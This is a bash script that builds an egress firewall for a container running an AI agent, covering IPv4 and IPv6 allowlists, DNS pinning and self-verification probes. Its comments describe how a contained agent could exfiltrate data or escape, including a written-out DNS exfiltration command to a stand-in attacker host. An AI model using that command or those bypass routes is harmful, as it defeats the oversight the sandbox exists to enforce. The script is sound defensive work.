#!/usr/bin/env bash
#
# claude-airlock egress firewall.
#
# Default-DROP on OUTPUT, for BOTH IPv4 AND IPv6. Allow only: the baked allowlist
# (firewall.conf, whose CORE lines are always on and whose GROUP-tagged lines apply only
# when their group is active), GitHub's published CIDR ranges (the "github" group), and
# any domains passed at run time via AIRLOCK_EXTRA_EGRESS. Active groups come from the
# host via AIRLOCK_EGRESS_GROUPS (empty = minimal / core-only). Runs as root from the
# entrypoint before Claude starts; the agent user cannot change this.
#
# IPv6 IS NOT OPTIONAL. This firewall was IPv4-only until a container on an
# IPv6-enabled host walked straight out to example.com over IPv6 while every iptables
# rule sat there looking correct: curl prefers AAAA, ip6tables was untouched, and the
# default v6 policy is ACCEPT. A single unfiltered address family is a total bypass —
# an agent could exfiltrate to anything with an AAAA record and the firewall would
# never see the packet. Both families are therefore programmed identically, and if
# IPv6 is reachable but unfilterable we ABORT rather than run half-contained.
#
# Known limitation (MVP): allowlist domains are resolved once, here. If an allowed host
# rotates IPs mid-session, new IPs won't be permitted until the next container start.
set -euo pipefail
IFS=$'\n\t'

CONF_FILE="/etc/airlock/firewall.conf"
IP_REGEX='^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$'
CIDR_REGEX='^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/[0-9]{1,2}$'
IP6_REGEX='^[0-9a-fA-F:]+$'
CIDR6_REGEX='^[0-9a-fA-F:]+/[0-9]{1,3}$'
# An IPv4 host+port grant. Kept as its own shape so a malformed port cannot fall
# through to the hostname path, where `dig` would fail to resolve it and report a
# network problem instead of the config error it actually is.
IPPORT_REGEX='^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]{1,5}$'
# Hostnames, deliberately strict. Anything matching none of these shapes is a typo.
DOMAIN_REGEX='^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*$'

log() { echo "[airlock-fw] $*"; }
die() { log "ERROR: $*"; exit 1; }

# Classify an allowlist entry by shape: ipport | ipv4 | ipv6 | domain | invalid.
# "invalid" is fatal at the call site. An entry we cannot classify can never be
# granted, so continuing would hand back a box that looks configured and silently
# is not - the same failure this file already refuses to tolerate elsewhere.
classify_entry() {
  local e="$1"
  if   [[ "$e" =~ $IPPORT_REGEX ]]; then echo ipport
  elif [[ "$e" =~ $IP_REGEX     ]]; then echo ipv4
  elif [[ "$e" == *:* ]] && [[ "$e" =~ $IP6_REGEX ]]; then echo ipv6
  elif [[ "$e" =~ $DOMAIN_REGEX ]]; then echo domain
  else echo invalid
  fi
}

# --- Can we filter IPv6, and do we even have it? -----------------------------------
# The dangerous combination is "the box can reach the v6 internet" + "we cannot program
# ip6tables". That is a silent fail-open, so it is a hard error. Having no IPv6 at all
# is fine (nothing to contain); we still install the v6 DROP policy defensively in case
# an address appears later.
HAVE_V6_ADDR=0
ip -6 addr show scope global 2>/dev/null | grep -q inet6 && HAVE_V6_ADDR=1
HAVE_IP6TABLES=0
if command -v ip6tables >/dev/null 2>&1 && ip6tables -L -n >/dev/null 2>&1; then
  HAVE_IP6TABLES=1
fi
if [ "$HAVE_IP6TABLES" = 0 ]; then
  if [ "$HAVE_V6_ADDR" = 1 ]; then
    die "this box has global IPv6 but ip6tables is unusable — cannot contain v6 egress. Refusing to start half-contained."
  fi
  log "WARN: ip6tables unavailable; no global IPv6 on this box, so nothing to contain."
fi

# Run an ip6tables command when v6 filtering is available — and DIE if it fails.
#
# This wrapper used to end in an unconditional `return 0`, which made every ip6tables
# error invisible: under errexit a failed `-P OUTPUT DROP` was simply skipped and the
# script carried on, leaving the v6 policy at its default ACCEPT. That is a silent
# fail-open, and it is silent in exactly the case this code claims to defend — a box
# with no v6 address yet, where the self-verify below never runs the v6 probe, so
# nothing would ever notice that the "defensive" v6 policy had not been installed.
# A rule we cannot install is a rule we do not have. Say so, and stop.
ip6() {
  [ "$HAVE_IP6TABLES" = 1 ] || return 0
  ip6tables "$@" || die "ip6tables $* failed — refusing to run with an unenforced IPv6 policy"
}

# Active egress groups (host-set; empty = minimal / core-only). A group-tagged
# firewall.conf line is honored only when its group is listed here. NB: do NOT name
# this GROUPS — that's a bash special variable (the user's gid array); assigning to
# it trips errexit and reading it returns a gid, not our list.
_egroups="${AIRLOCK_EGRESS_GROUPS:-}"
ACTIVE_GROUPS=" ${_egroups//,/ } "
group_active() { case "$ACTIVE_GROUPS" in *" $1 "*) return 0 ;; *) return 1 ;; esac; }
log "egress groups: ${AIRLOCK_EGRESS_GROUPS:-<none: minimal>}"
log "ipv6: address=$([ "$HAVE_V6_ADDR" = 1 ] && echo yes || echo no) filtering=$([ "$HAVE_IP6TABLES" = 1 ] && echo yes || echo no)"

# --- Assemble allowed domains: core (always) + active groups + AIRLOCK_EXTRA_EGRESS ---
DOMAINS=()
if [ -f "$CONF_FILE" ]; then
  while IFS= read -r line; do
    line="${line%%#*}"; line="$(echo "$line" | xargs || true)"
    [ -z "$line" ] && continue
    # A group prefix and an IP:port literal both contain a colon, so dispatching on
    # "*:*" alone read `10.1.15.115:8428` as group "10.1.15.115" + domain "8428" and
    # skipped it as an inactive group - a log line that reads like normal operation.
    # Only a token that could actually BE a group name (letter-led, no dots) is
    # treated as a prefix; anything else is a plain entry.
    case "$line" in
      *:*)
        grp="${line%%:*}"; dom="${line#*:}"
        if [[ "$grp" =~ ^[a-zA-Z][a-zA-Z0-9_-]*$ ]]; then
          group_active "$grp" || { log "skip $dom (group '$grp' inactive)"; continue; }
          DOMAINS+=("$dom")
        else
          DOMAINS+=("$line")                # IP:port or IPv6 literal, not a group prefix
        fi ;;
      *) DOMAINS+=("$line") ;;              # untagged core line — always
    esac
  done < "$CONF_FILE"
fi
if [ -n "${AIRLOCK_EXTRA_EGRESS:-}" ]; then
  # Split on comma, space, tab or newline - EXPLICITLY, via a scoped IFS.
  # This cannot use the word splitting of an unquoted expansion: the script runs
  # under a strict IFS ($'\n\t') that deliberately excludes the space, so the old
  # `for d in ${AIRLOCK_EXTRA_EGRESS//,/ }` turned "a,b" into a single element
  # containing the whole list. Every multi-entry grant was lost, and the only
  # symptom was one WARN naming the entire list as an unresolvable "domain".
  IFS=$' \t\n,' read -r -a _extra <<< "$AIRLOCK_EXTRA_EGRESS"
  for d in "${_extra[@]}"; do [ -n "$d" ] && DOMAINS+=("$d"); done
fi
log "allowlist domains: ${#DOMAINS[@]}"

# --- Preserve Docker embedded DNS (127.0.0.11) before flushing ---
# A no-op under podman (which has no 127.0.0.11 resolver); harmless to keep for Docker.
DOCKER_DNS_RULES="$(iptables-save -t nat | grep '127\.0\.0\.11' || true)"
iptables -F; iptables -X
iptables -t nat -F; iptables -t nat -X
iptables -t mangle -F; iptables -t mangle -X
ip6 -F; ip6 -X
ipset destroy allowed-domains    2>/dev/null || true
ipset destroy allowed-domains-v6 2>/dev/null || true
ipset destroy allowed-ipport     2>/dev/null || true
ipset destroy github-ranges      2>/dev/null || true
ipset destroy github-ranges-v6   2>/dev/null || true
if [ -n "$DOCKER_DNS_RULES" ]; then
  iptables -t nat -N DOCKER_OUTPUT 2>/dev/null || true
  iptables -t nat -N DOCKER_POSTROUTING 2>/dev/null || true
  echo "$DOCKER_DNS_RULES" | xargs -L 1 iptables -t nat
fi

# --- Baseline: loopback ---
iptables -A OUTPUT -o lo -j ACCEPT
iptables -A INPUT  -i lo -j ACCEPT
ip6 -A OUTPUT -o lo -j ACCEPT
ip6 -A INPUT  -i lo -j ACCEPT

# --- ICMPv6: neighbour discovery ---
# IPv6 is not IPv4 with longer addresses: ND (RFC 4861) replaces ARP, and it rides on
# ICMPv6. A box that cannot exchange NS/NA never learns its router's link-layer address
# and has NO working IPv6 at all, so an allowlisted domain that only resolves over v6
# becomes unreachable and the v6 allowlist below is decorative.
#
# It costs no containment: the allowlist is enforced on TCP/443 regardless, and ND is
# link-local by construction. RFC 4890 §4.4.1 says permit these. Note this box does NOT
# need them under the default rootless-podman/pasta engine (pasta terminates traffic in
# userspace, so there is no link layer to discover, and v6 works without these rules —
# verified). They matter on a real bridge, i.e. Docker or rootful podman with IPv6
# enabled, where without them v6 breaks CLOSED: curl silently falls back to IPv4 and the
# only symptom is that everything got slower.
#
# ICMPv6 errors (packet-too-big for PMTUD, dest-unreachable) are deliberately NOT listed:
# conntrack already accepts them as RELATED to the flow that provoked them.
for t in router-solicitation router-advertisement \
         neighbour-solicitation neighbour-advertisement; do
  ip6 -A OUTPUT -p icmpv6 --icmpv6-type "$t" -j ACCEPT
  ip6 -A INPUT  -p icmpv6 --icmpv6-type "$t" -j ACCEPT
done

# --- DNS: ONLY to the resolvers this box is actually configured to use ---
# Port 53 used to be open to ANY destination, which is a hole big enough to drive the
# whole threat model through: `dig @attacker-ns.example $(base64 <secret).evil.com`
# exfiltrates in plain sight, over an allowed port, to an attacker-chosen server, and a
# default-DROP egress firewall never sees a thing.
#
# Pinning to /etc/resolv.conf's nameservers does NOT eliminate DNS exfiltration — an
# agent can still tunnel data as query names through the legitimate resolver to a
# hostile authoritative server, and no allowlist of resolvers can stop that. What it
# does remove is the trivial channel: the agent no longer picks the destination, so the
# data must pass through the resolver you already trust (which logs, caches, and is very
# often not the attacker's). Narrowing, not closing. Named so nobody mistakes it.
NAMESERVERS=()
while read -r ns; do [ -n "$ns" ] && NAMESERVERS+=("$ns"); done < <(
  awk '/^[[:space:]]*nameserver[[:space:]]/ {print $2}' /etc/resolv.conf 2>/dev/null || true
)
[ ${#NAMESERVERS[@]} -eq 0 ] && die "no nameserver in /etc/resolv.conf — cannot resolve the allowlist"
for ns in "${NAMESERVERS[@]}"; do
  if [[ "$ns" =~ $IP_REGEX ]]; then
    iptables -A OUTPUT -p udp -d "$ns" --dport 53 -j ACCEPT
    iptables -A OUTPUT -p tcp -d "$ns" --dport 53 -j ACCEPT
  elif [[ "$ns" =~ $IP6_REGEX ]]; then
    ip6 -A OUTPUT -p udp -d "$ns" --dport 53 -j ACCEPT
    ip6 -A OUTPUT -p tcp -d "$ns" --dport 53 -j ACCEPT
  else
    log "WARN: ignoring unparseable nameserver '$ns'"
  fi
done
log "dns: pinned to ${#NAMESERVERS[@]} configured resolver(s)"

# --- Resolve allowlist domains into per-family ipsets ---
# A and AAAA both: a domain reachable over v6 must be allowed over v6, or Claude breaks
# on an IPv6-preferring host. A domain with no AAAA simply contributes nothing to the v6
# set — which is correct, not an error.
ipset create allowed-domains    hash:net
ipset create allowed-domains-v6 hash:net family inet6
ipset create allowed-ipport     hash:ip,port          # exact IPv4 host+port grants (non-443 datasources)
for dom in "${DOMAINS[@]}"; do
  resolved=0

  # Literal pins use `ipset add -exist`, so a duplicate (two allowlisted names, or two
  # configs, naming the same endpoint) is a no-op while a REAL rejection - an octet or
  # port out of range, say - aborts. These are explicit operator grants: one that the
  # kernel refuses must not be swallowed, or the box comes up looking granted.
  case "$(classify_entry "$dom")" in
    ipport)
      # An IP:port literal grants exactly ONE host+port. The HTTPS rule below matches
      # allowed-domains only on --dport 443, so a bare datasource IP on a non-standard port
      # (e.g. VictoriaLogs on 9428) would still be dropped. hash:ip,port + a dst,dst match
      # opens precisely that endpoint and nothing else — the tightest datasource grant.
      ip="${dom%:*}"; port="${dom##*:}"
      ipset add -exist allowed-ipport "${ip},tcp:${port}" \
        || die "could not pin ${ip}:${port} — check the address and port are in range"
      log "pinned literal ${ip}:${port} (tcp)"
      continue ;;
    ipv4)
      # A raw IP literal is a static pin — there is nothing to resolve, and passing it to `dig`
      # (which would treat it as a hostname) yields nothing, so it would be dropped as
      # "could not resolve". Internal datasources here have no DNS yet (e.g. VictoriaLogs is
      # reached by IP), and a worker box must be able to egress to the datasource it is building
      # against to test its own work. Add the literal straight to the matching-family ipset. This
      # is the SAFEST egress case: no DNS indirection, no re-resolution drift — the pin is exact.
      ipset add -exist allowed-domains "$dom" || die "could not pin IPv4 literal $dom"
      log "pinned literal IPv4 $dom (port 443 only — use IP:port for other ports)"
      continue ;;
    ipv6)
      ipset add -exist allowed-domains-v6 "$dom" || die "could not pin IPv6 literal $dom"
      log "pinned literal IPv6 $dom"
      continue ;;
    invalid)
      die "egress entry '$dom' is not a valid hostname, IPv4, IPv6, or IPv4:port. Refusing to start: a grant that can never apply would leave this box looking configured while silently having no access." ;;
  esac

  ips="$(dig +short A "$dom" | grep -E "$IP_REGEX" || true)"
  if [ -n "$ips" ]; then
    resolved=1
    while read -r ip; do
      # A duplicate IP (two allowlisted names resolving to the same host) is benign and
      # must not abort the run under errexit -- `-exist` says exactly that, which is why
      # this no longer discards the error wholesale. A rejection that is NOT a duplicate
      # means the address was not granted, and that has to be visible: swallowing it is
      # how a multi-entry grant once came up looking configured with nothing programmed.
      # Not fatal, unlike an operator's literal pin: one A record among several can fail
      # while the domain stays reachable through the rest.
      if [ -n "$ip" ]; then
        ipset add -exist allowed-domains "$ip" \
          || log "WARN: could not add $ip (for $dom) — that address is NOT granted"
      fi
    done <<< "$ips"
  fi
  ips6="$(dig +short AAAA "$dom" | grep -E "$IP6_REGEX" || true)"
  if [ -n "$ips6" ]; then
    resolved=1
    while read -r ip6addr; do
      if [ -n "$ip6addr" ]; then
        ipset add -exist allowed-domains-v6 "$ip6addr" \
          || log "WARN: could not add $ip6addr (for $dom) — that address is NOT granted"
      fi
    done <<< "$ips6"
  fi
  [ "$resolved" = 0 ] && log "WARN: could not resolve $dom"
done

# --- GitHub published CIDR ranges (git + api + web) — only in the "github" group ---
# The ipsets are always created (the rules below reference them); they just stay empty
# when the group is inactive, so GitHub is unreachable in minimal mode. GitHub publishes
# both v4 and v6 CIDRs; we used to `grep -v ':'` the v6 ones away, which — combined with
# an unfiltered v6 stack — meant GitHub was reachable over v6 even in minimal mode.
ipset create github-ranges    hash:net
ipset create github-ranges-v6 hash:net family inet6
if group_active github; then
  gh_meta="$(curl -fsS https://api.github.com/meta || true)"
  if echo "$gh_meta" | jq -e '.git and .api and .web' >/dev/null 2>&1; then
    gh_cidrs="$(echo "$gh_meta" | jq -r '(.git + .api + .web)[]')"
    # `aggregate` collapses IPv4 ranges only; feed it just the v4 set.
    while read -r cidr; do
      if [[ "$cidr" =~ $CIDR_REGEX ]]; then
        ipset add -exist github-ranges "$cidr" \
          || log "WARN: could not add GitHub range $cidr — that range is NOT granted"
      fi
    done < <(echo "$gh_cidrs" | grep -v ':' | aggregate -q 2>/dev/null || true)
    while read -r cidr; do
      if [[ "$cidr" =~ $CIDR6_REGEX ]]; then
        ipset add -exist github-ranges-v6 "$cidr" \
          || log "WARN: could not add GitHub range $cidr — that range is NOT granted"
      fi
    done < <(echo "$gh_cidrs" | grep ':' || true)
    # Count actual members. `ipset list | grep -c ':'` would also count every header
    # line (Name:, Type:, Size in memory: ...), so the v6 figure was inflated by ~8.
    log "github ranges loaded (v4: $(ipset save github-ranges | grep -c '^add ' || true), v6: $(ipset save github-ranges-v6 | grep -c '^add ' || true))"
  else
    log "WARN: could not load GitHub ranges"
  fi
else
  log "github group inactive — GitHub unreachable"
fi

# --- NO blanket allow for the container's own /24 ---
# There is deliberately no rule accepting the subnet derived from the default route.
# Do not add one back. It is unnecessary, and it is dangerous:
#
#   * Unnecessary — DNS is already covered by the explicit port-53 rules above, and
#     Docker's embedded resolver (127.0.0.11) by the loopback rule. Nothing else in the
#     box has any business talking to the gateway.
#   * Dangerous — the container's default route is not always a private bridge. Under
#     rootless podman with pasta the box INHERITS THE HOST'S NETWORK CONFIG, so the
#     default gateway is the host's real LAN gateway; deriving a /24 from it and
#     ACCEPTing it hands the sandbox a slice of your actual local network. That is the
#     lateral movement this firewall exists to prevent.
#
# The allowlist below is the only way out of this box.

# --- Default DROP + established, BOTH families ---
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP
iptables -A INPUT  -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
ip6 -P INPUT DROP
ip6 -P FORWARD DROP
ip6 -P OUTPUT DROP
ip6 -A INPUT  -m state --state ESTABLISHED,RELATED -j ACCEPT
ip6 -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# --- Permit HTTPS (and git-ssh to GitHub) to the allowed sets, both families ---
iptables -A OUTPUT -p tcp --dport 443 -m set --match-set allowed-domains dst -j ACCEPT
iptables -A OUTPUT -p tcp -m set --match-set allowed-ipport dst,dst -j ACCEPT   # exact host+port grants (any port)
iptables -A OUTPUT -p tcp --dport 443 -m set --match-set github-ranges  dst -j ACCEPT
iptables -A OUTPUT -p tcp --dport 22  -m set --match-set github-ranges  dst -j ACCEPT
iptables -A OUTPUT -j REJECT --reject-with icmp-admin-prohibited
ip6 -A OUTPUT -p tcp --dport 443 -m set --match-set allowed-domains-v6 dst -j ACCEPT
ip6 -A OUTPUT -p tcp --dport 443 -m set --match-set github-ranges-v6   dst -j ACCEPT
ip6 -A OUTPUT -p tcp --dport 22  -m set --match-set github-ranges-v6   dst -j ACCEPT
ip6 -A OUTPUT -j REJECT --reject-with icmp6-adm-prohibited

# --- Self-verify: containment must hold on EVERY family the box can actually use ---
# Both directions matter. A firewall that blocks everything would pass a block-only
# check while being useless; one that allows everything would pass a reachability check
# while containing nothing. And the check must be per-family: this whole class of bug
# existed because the v4 test passed while v6 walked out the back door.
if curl -4 --connect-timeout 5 -s https://example.com >/dev/null 2>&1; then
  die "egress NOT contained over IPv4 — reached example.com"
fi
log "OK: example.com blocked (IPv4)"

if [ "$HAVE_V6_ADDR" = 1 ]; then
  if curl -6 --connect-timeout 5 -s https://example.com >/dev/null 2>&1; then
    die "egress NOT contained over IPv6 — reached example.com. The v6 rules did not take effect."
  fi
  log "OK: example.com blocked (IPv6)"

  # Positive control for v6. "example.com is blocked over IPv6" is only evidence of
  # containment if IPv6 WORKS in the first place: a box whose v6 stack is broken passes
  # the check above for entirely the wrong reason — and would go on passing it on the day
  # a real leak appears. So prove the v6 path is live by reaching something we do allow
  # over it. A dead v6 path is degraded, not unsafe (curl falls back to v4), so this
  # warns rather than aborts.
  if [ "$(ipset save allowed-domains-v6 | grep -c '^add ' || true)" -gt 0 ]; then
    if curl -6 --connect-timeout 5 -s https://api.anthropic.com >/dev/null 2>&1; then
      log "OK: allowlisted host reachable over IPv6 (so the v6 block above is the firewall, not a dead stack)"
    else
      log "WARN: IPv6 is configured but no allowlisted host answered over it — the v6 path"
      log "WARN: looks broken, so 'example.com blocked (IPv6)' proves little. Claude will"
      log "WARN: still work over IPv4."
    fi
  fi
else
  log "OK: no global IPv6 on this box (nothing to contain)"
fi

if ! curl --connect-timeout 5 -s https://api.anthropic.com >/dev/null 2>&1; then
  log "WARN: api.anthropic.com unreachable — Claude may not work"
else
  log "OK: api.anthropic.com reachable"
fi
log "firewall ready"
